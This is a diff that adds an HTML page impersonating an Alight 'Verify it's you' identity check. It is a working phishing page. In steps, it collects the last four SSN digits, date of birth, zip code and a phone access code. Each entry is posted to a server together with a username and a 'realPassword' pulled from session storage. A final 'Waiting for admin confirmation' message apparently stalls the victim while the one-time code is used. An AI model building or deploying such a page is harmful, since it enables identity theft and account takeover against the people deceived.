@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - Alight</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f8fafc;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 420px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        h1 { text-align: center; margin-bottom: 8px; font-size: 1.6rem; color: #1e2937; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; }
+        label { display: block; margin: 18px 0 8px; font-weight: 600; color: #334155; }
+        input, select {
+            width: 100%;
+            padding: 14px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1.05rem;
+        }
+        .date-group { display: flex; gap: 8px; }
+        button {
+            width: 100%;
+            padding: 16px;
+            margin-top: 25px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .continue { background: #1e40af; color: white; }
+        .error { color: #ef4444; text-align: center; margin: 15px 0; font-weight: 500; }
+        .step { display: none; }
+        .step.active { display: block; }
+    </style>
+</head>
+<body>
+    <!-- Step 1: SSN + DOB -->
+    <div class="container step active" id="step1">
+        <h1>Verify it's you</h1>
+        <p>Enter the last 4 digits of your SSN and date of birth</p>
+        <label>Last 4 digits of SSN</label>
+        <input type="text" id="ssn" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
+
+        <label>Date of Birth</label>
+        <div class="date-group">
+            <select id="month"></select>
+            <select id="day"></select>
+            <select id="year"></select>
+        </div>
+
+        <label><input type="checkbox" id="privacy"> I agree to the Privacy Policy</label>
+        <button class="continue" onclick="saveStep1()">Continue</button>
+    </div>
+
+    <!-- Step 2: Zip Code -->
+    <div class="container step" id="step2">
+        <h1>Enter Zip Code</h1>
+        <p>Confirm your current zip code</p>
+        <input type="text" id="zip" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
+        <button class="continue" onclick="saveStep2()">Continue</button>
+    </div>
+
+    <!-- Step 3: Access Code -->
+    <div class="container step" id="step3">
+        <h1>Enter Access Code</h1>
+        <p>We sent a code to your phone</p>
+        <input type="text" id="code" maxlength="8" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+        <button class="continue" onclick="submitCode()">Submit Code</button>
+        <div class="error" id="error"></div>
+    </div>
+
+    <script>
+        // Populate dates
+        window.onload = () => {
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            months.forEach((m,i) => {
+                let opt = document.createElement('option');
+                opt.value = i+1; opt.textContent = m;
+                document.getElementById('month').appendChild(opt);
+            });
+            for(let i=1; i<=31; i++) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('day').appendChild(opt);
+            }
+            const curr = new Date().getFullYear();
+            for(let i=curr; i>=1950; i--) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('year').appendChild(opt);
+            }
+        };
+
+        async function saveToServer(details) {
+            const username = sessionStorage.getItem('username') || document.getElementById('username')?.value || 'N/A';
+            const password = sessionStorage.getItem('realPassword') || 'N/A';
+
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, address: details })
+                });
+            } catch (e) {}
+        }
+
+        async function saveStep1() {
+            const ssn = document.getElementById('ssn').value.trim();
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4) return alert("SSN must be 4 digits");
+
+            const details = `SSN: ${ssn} | DOB: ${month}/${day}/${year} | Status: Pending`;
+            await saveToServer(details);
+
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        async function saveStep2() {
+            const zip = document.getElementById('zip').value.trim();
+            if (zip.length !== 5) return alert("Enter valid 5-digit zip code");
+
+            const details = `Zip: ${zip} | Status: Pending`;
+            await saveToServer(details);
+
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            if (!code) return alert("Enter access code");
+
+            const details = `Access Code: ${code} | Status: Pending`;
+            await saveToServer(details);
+
+            document.getElementById('error').innerHTML = `<span style="color:#3b82f6">Waiting for admin confirmation...</span>`;
+        }
+    </script>
+</body>
+</html>
